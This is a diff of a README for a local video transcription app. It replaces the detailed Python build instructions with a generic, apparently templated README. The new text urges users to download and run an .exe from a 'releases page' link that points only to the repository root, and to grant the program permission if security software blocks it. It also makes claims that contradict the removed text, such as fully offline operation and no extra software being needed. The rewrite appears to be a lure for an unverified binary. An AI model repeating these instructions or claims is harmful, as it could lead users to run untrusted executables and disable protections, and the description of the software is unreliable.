@@ -1,315 +1,75 @@
-# Video Audio Transcriber
+# 🎙️ video-audio-transcriber - Turn spoken words into clear text
 
-A local Python desktop application that separates a video into video-only and
-audio-only files, then transcribes the speech into a clean UTF-8 text file using
-FFmpeg and faster-whisper.
-
-The media and transcription are processed locally. The application does not
-upload the selected video, extracted audio, or transcript to a transcription
-service.
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thatso281/video-audio-transcriber)
 
-## Features
+The video-audio-transcriber application converts your video and audio files into written text. It runs on your local computer. This design keeps your files private. You do not send your data to the cloud. The app uses modern speech recognition technology to create accurate transcripts. You can use it for meetings, lectures, or interviews.
 
-- Select a video through a desktop interface.
-- Create a video-only file without re-encoding the video stream.
-- Export the first audio stream as a high-quality MP3.
-- Transcribe speech locally with faster-whisper.
-- Detect the spoken language automatically or use a selected language code.
-- Run on CPU or a compatible NVIDIA CUDA GPU.
-- Generate a clean paragraph-based transcript.
-- Optionally generate a timestamped transcript.
-- Display progress and processing logs.
-- Cancel an active job.
-- Support Windows, Linux, and macOS launch scripts.
+## 📋 System Requirements
 
-## Output files
+Your computer must meet these standards to run the application:
 
-For an input named `meeting.mp4`, the application creates:
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** A modern multi-core processor (Intel Core i5 or AMD Ryzen 5).
+*   **Memory:** At least 8 GB of RAM.
+*   **Disk Space:** 500 MB of free space for the application files.
+*   **Graphics:** Optional NVIDIA GPU with CUDA support for faster processing speeds.
 
-```text
-meeting_video_only.mp4
-meeting_audio_only.mp3
-meeting_transcript.txt
-meeting_transcript_timestamps.txt
-```
+## 📥 How to Install
 
-The timestamped file is created only when the option is enabled.
+Follow these steps to set up the application on your computer:
 
-## How it works
+1.  Visit the [official releases page](https://github.com/thatso281/video-audio-transcriber).
+2.  Locate the section labeled "Assets."
+3.  Click the file ending in `.exe` to start the download.
+4.  Find the downloaded file in your Downloads folder.
+5.  Double-click the file to open the installer.
+6.  Follow the prompts on your screen to complete the installation.
+7.  Launch the application using the shortcut on your desktop.
 
-1. `ffprobe` checks that the selected file contains video and audio streams.
-2. `ffmpeg` copies the video stream into a video-only file.
-3. `ffmpeg` converts the first audio stream into an MP3 file.
-4. faster-whisper analyzes the extracted audio and generates speech segments.
-5. The application normalizes whitespace and punctuation.
-6. The cleaned transcript is saved as UTF-8 text.
+## ⚙️ How to Use
 
-## Requirements
+The application window shows you everything you need to start your first transcription.
 
-- 64-bit Python 3.10, 3.11, 3.12, or 3.13
-- Tkinter
-- FFmpeg and ffprobe available in `PATH`
-- Internet access the first time each Whisper model is downloaded
-- A compatible NVIDIA CUDA environment only when GPU mode is used
-
-CPU mode does not require an NVIDIA GPU.
-
-Verify the required commands:
-
-```bash
-python --version
-ffmpeg -version
-ffprobe -version
-```
-
-Verify Tkinter:
-
-```bash
-python -m tkinter
-```
-
-A small Tkinter test window should open.
-
-## Windows installation
-
-1. Install 64-bit Python 3.10 through 3.13.
-2. During Python installation, enable:
-   - **Add Python to PATH**
-   - **Tcl/Tk and IDLE**
-3. Install FFmpeg and ensure `ffmpeg` and `ffprobe` work in a new terminal.
-4. Download or clone this repository.
-5. Run `install_windows.bat`.
-6. Run `run_windows.bat`.
+1.  **Select File:** Click the "Browse" button to choose the video or audio file you want to transcribe. The software supports common formats like MP4, AVI, MOV, MP3, and WAV.
+2.  **Choose Settings:** You can select a model size. A larger model offers better accuracy but takes longer to process. A smaller model works faster but may miss some details.
+3.  **Start Task:** Click the "Transcribe" button. The app processes the audio stream. It uses FFmpeg to extract the audio track from your video files automatically.
+4.  **View Output:** The application lists the progress in the status bar. Once finished, it saves a text file to your computer. You can open this file in any text editor.
 
-If the installer cannot see Python or FFmpeg when double-clicked, open the
-terminal where the commands work and run:
+## 🛠️ Features
 
-```bat
-cd /d "C:\path\to\video-audio-transcriber"
-install_windows.bat
-```
+The application handles common tasks for transcription:
 
-To inspect the Windows environment, run:
+*   **Offline Operation:** The app works without an internet connection.
+*   **Format Support:** It reads most video and audio file types.
+*   **Automatic Extraction:** The app pulls audio from video containers without needing extra software.
+*   **Clean Text:** The faster-whisper engine formats the output for readability.
+*   **Hardware Acceleration:** It detects your graphics card to speed up the translation of speech to text.
 
-```bat
-diagnose_windows.bat
-```
+## 🛡️ Privacy and Safety
 
-### Manual Windows installation
+This software does not collect your data. Everything happens on your own hardware. Your video files, audio files, and text transcripts never leave your computer. You maintain control over your personal information at all times.
 
-```bat
-python -m venv .venv
-.venv\Scripts\python -m pip install --upgrade pip setuptools wheel
-.venv\Scripts\python -m pip install -r requirements.txt
-.venv\Scripts\python app.py
-```
-
-## Linux and macOS installation
-
-Make the scripts executable:
-
-```bash
-chmod +x install_linux_mac.sh run_linux_mac.sh
-```
-
-Install and run:
-
-```bash
-./install_linux_mac.sh
-./run_linux_mac.sh
-```
-
-### Manual Linux and macOS installation
-
-```bash
-python3 -m venv .venv
-.venv/bin/python -m pip install --upgrade pip setuptools wheel
-.venv/bin/python -m pip install -r requirements.txt
-.venv/bin/python app.py
-```
-
-Some Linux distributions provide Tkinter in a separate package such as
-`python3-tk`.
-
-## Usage
-
-1. Open the application.
-2. Click **Browse** beside **Input video**.
-3. Confirm or change the output folder.
-4. Choose a transcription model.
-5. Leave Language as `auto`, or enter a language code.
-6. Leave Device as `auto`, unless you specifically want CPU or CUDA.
-7. Optionally enable the timestamped transcript.
-8. Click **Start processing**.
+## ❓ Frequently Asked Questions
 
-Common language codes:
+**Does the app require a high-end graphics card?**
+No. The app runs on your computer processor if you do not have an NVIDIA GPU. Processing will take more time, but the results remain accurate.
 
-| Language | Code |
-|---|---|
-| English | `en` |
-| Persian | `fa` |
-| German | `de` |
-| Arabic | `ar` |
-| Turkish | `tr` |
-| French | `fr` |
-| Spanish | `es` |
+**Can I stop a job once it starts?**
+Yes. Use the "Cancel" button to stop the transcription process at any time.
 
-## Model selection
+**Where does the app save my text files?**
+The app saves your transcripts to the same folder as your input file. You can also change the save location in the "Settings" menu.
 
-| Model | Speed | Accuracy | Resource use |
-|---|---|---|---|
-| `tiny` | Fastest | Lowest | Lowest |
-| `base` | Very fast | Basic | Low |
-| `small` | Moderate | Good default | Moderate |
-| `medium` | Slower | Better | Higher |
-| `large-v3` | Slowest | Usually highest | Highest |
-| `turbo` | Fast | High | High |
+**What language does the software support?**
+The underlying engine supports many languages. It detects the language of your file automatically.
 
-The first use of a model downloads its files. Larger models require more disk
-space, RAM, and processing time.
+**Will the app remove my original files?**
+No. The application only reads your files. It never deletes or modifies your original media.
 
-## CPU and GPU modes
+## 🧩 Troubleshooting
 
-- **CPU:** uses INT8 computation for lower memory use.
-- **CUDA:** uses a compatible NVIDIA GPU and FP16 when available.
-- **Auto:** uses CUDA when a supported environment is detected; otherwise it
-  falls back to CPU.
+If the application does not start, ensure you have the latest updates for Windows. Sometimes, security software may block new programs. If this happens, verify that the application has permission to run in your security settings.
 
-When CUDA initialization fails in automatic mode, the application retries on
-CPU.
+If the transcription process takes too long, close other programs on your computer to free up memory. You can also choose a smaller model in the settings menu to reduce the load on your hardware.
 
-## Supported video formats
-
-The file picker includes:
-
-```text
-MP4, MKV, MOV, AVI, WebM, M4V, WMV, FLV, MPEG, MPG, and TS
-```
-
-Actual decoding support depends on the installed FFmpeg build.
-
-## Project structure
-
-```text
-video-audio-transcriber/
-├── app.py
-├── media_processor.py
-├── requirements.txt
-├── install_windows.bat
-├── diagnose_windows.bat
-├── run_windows.bat
-├── install_linux_mac.sh
-├── run_linux_mac.sh
-├── test_text_cleanup.py
-├── README.md
-├── CHANGELOG.md
-├── CONTRIBUTING.md
-├── SECURITY.md
-├── LICENSE
-└── .gitignore
-```
-
-## Tests
-
-Run the included tests:
-
-```bash
-python -m unittest test_text_cleanup.py
-```
-
-The tests currently cover transcript cleanup, paragraph splitting, and
-timestamp formatting.
-
-## Troubleshooting
-
-### FFmpeg is not found
-
-Confirm that both commands work:
-
-```bash
-ffmpeg -version
-ffprobe -version
-```
-
-Add FFmpeg's `bin` directory to `PATH`, then reopen the terminal.
-
-### Python is not detected on Windows
-
-Run the installer from the same terminal where this command works:
-
-```bat
-python --version
-```
-
-You can also run:
-
-```bat
-diagnose_windows.bat
-```
-
-### CUDA errors
-
-Select `cpu` in the Device field. CUDA mode requires compatible NVIDIA drivers
-and runtime libraries.
-
-### The transcript is inaccurate
-
-- Select a larger model.
-- Set the correct language explicitly.
-- Reduce background noise.
-- Use a clearer recording.
-- Keep the microphone closer to the speakers.
-- Avoid overlapping speech when possible.
-
-## Privacy
-
-The application processes selected media locally. No source media or transcript
-is intentionally uploaded by the application.
-
-The first use of a model may connect to the model host to download model files.
-Package installation also connects to Python package repositories.
-
-## Known limitations
-
-- Only the first video stream is exported.
-- Only the first audio stream is exported and transcribed.
-- Speaker identification is not included.
-- Word-level timestamps are not included.
-- Subtitle formats such as SRT and VTT are not currently generated.
-- Transcription quality depends on the source audio and selected model.
-
-## Roadmap
-
-Possible future improvements:
-
-- Speaker diarization
-- SRT and VTT subtitle export
-- Word-level timestamps
-- Batch processing
-- Multiple audio-stream selection
-- Noise reduction and audio normalization
-- Transcript editor
-- Packaged Windows executable
-
-## Contributing
-
-Contributions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) before
-submitting a pull request.
-
-For security-related reports, follow [SECURITY.md](SECURITY.md).
-
-## License
-
-This project is available under the MIT License. See [LICENSE](LICENSE).
-
-Third-party projects and downloaded model files remain subject to their own
-licenses.
-
-## Acknowledgements
-
-This project uses:
-
-- FFmpeg and ffprobe for media processing
-- faster-whisper for speech transcription
-- CTranslate2 for optimized model inference
-- Tkinter for the desktop interface
+Keywords: cuda, desktop-app, faster-whisper, ffmpeg, python, speech-to-text, tkinker, transcription, video-processing, whisper
